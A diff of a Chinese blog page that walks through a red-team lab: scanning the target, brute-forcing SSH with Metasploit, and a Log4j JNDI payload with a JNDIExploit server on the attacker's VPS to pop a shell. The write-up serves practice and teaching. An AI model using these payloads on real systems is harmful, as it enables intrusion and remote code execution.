@@ -16,16 +16,16 @@
   <meta name="author" content="QY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="渗透攻击红队域渗透靶场-2（redteam.lab）外网打点靶场的服务机是ubantu，ifconfig拿到IP渗透   直接访问发现没有服务，上nmap扫一波 nmap -A 192.168.123.58 -p-     发现有两端口开着 22端口的ssh和38080的http服务 ssh端口弱口令爆破 既然开了就得试试 使用msf爆破 1234567891011使用模板     use aux">
+    <meta name="description" content="渗透攻击红队域渗透靶场-2（redteam.lab）外网打点靶场的服务机是ubuntu，ifconfig拿到IP渗透   直接访问发现没有服务，上nmap扫一波 nmap -A 192.168.123.58 -p-     发现有两端口开着 22端口的ssh和38080的http服务 ssh端口弱口令爆破 既然开了就得试试 使用msf爆破 1234567891011使用模板     use aux">
 <meta property="og:type" content="article">
 <meta property="og:title" content="redteam-2靶场">
 <meta property="og:url" content="http://example.com/2023/04/01/redteam-2%E9%9D%B6%E5%9C%BA/index.html">
 <meta property="og:site_name" content="yaya-blog">
-<meta property="og:description" content="渗透攻击红队域渗透靶场-2（redteam.lab）外网打点靶场的服务机是ubantu，ifconfig拿到IP渗透   直接访问发现没有服务，上nmap扫一波 nmap -A 192.168.123.58 -p-     发现有两端口开着 22端口的ssh和38080的http服务 ssh端口弱口令爆破 既然开了就得试试 使用msf爆破 1234567891011使用模板     use aux">
+<meta property="og:description" content="渗透攻击红队域渗透靶场-2（redteam.lab）外网打点靶场的服务机是ubuntu，ifconfig拿到IP渗透   直接访问发现没有服务，上nmap扫一波 nmap -A 192.168.123.58 -p-     发现有两端口开着 22端口的ssh和38080的http服务 ssh端口弱口令爆破 既然开了就得试试 使用msf爆破 1234567891011使用模板     use aux">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304011028169.jpg">
 <meta property="article:published_time" content="2023-04-01T02:26:02.000Z">
-<meta property="article:modified_time" content="2023-04-01T09:41:08.349Z">
+<meta property="article:modified_time" content="2023-04-02T01:30:37.942Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="域渗透">
 <meta property="article:tag" content="靶场wp">
@@ -277,7 +277,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="渗透攻击红队域渗透靶场-2（redteam-lab）"><a href="#渗透攻击红队域渗透靶场-2（redteam-lab）" class="headerlink" title="渗透攻击红队域渗透靶场-2（redteam.lab）"></a>渗透攻击红队域渗透靶场-2（redteam.lab）</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>靶场的服务机是ubantu，ifconfig拿到IP渗透</p>
+                <h1 id="渗透攻击红队域渗透靶场-2（redteam-lab）"><a href="#渗透攻击红队域渗透靶场-2（redteam-lab）" class="headerlink" title="渗透攻击红队域渗透靶场-2（redteam.lab）"></a>渗透攻击红队域渗透靶场-2（redteam.lab）</h1><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>靶场的服务机是ubuntu，ifconfig拿到IP渗透</p>
 <img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304011036537.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
 <p>直接访问发现没有服务，上nmap扫一波</p>
@@ -297,7 +297,7 @@
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//IP地址&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>先用dnslog打一下</p>
-<p>但是打了半天没返回，才发现是ubanto没通外网</p>
+<p>但是打了半天没返回，才发现是ubuntu没通外网</p>
 <p>那直接尝试弹shell</p>
 <p>使用JNDI利用工具</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.3-SNAPSHOT-2.jar -i local_ip_address(vps地址)<br></code></pre></td></tr></table></figure>
@@ -533,6 +533,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/04/01/sova%E5%AE%9E%E7%94%A8%E6%8E%A2%E6%B5%8B%E7%AE%AD/" title="sova实用探测箭">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sova实用探测箭</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
@@ -832,5 +838,20 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
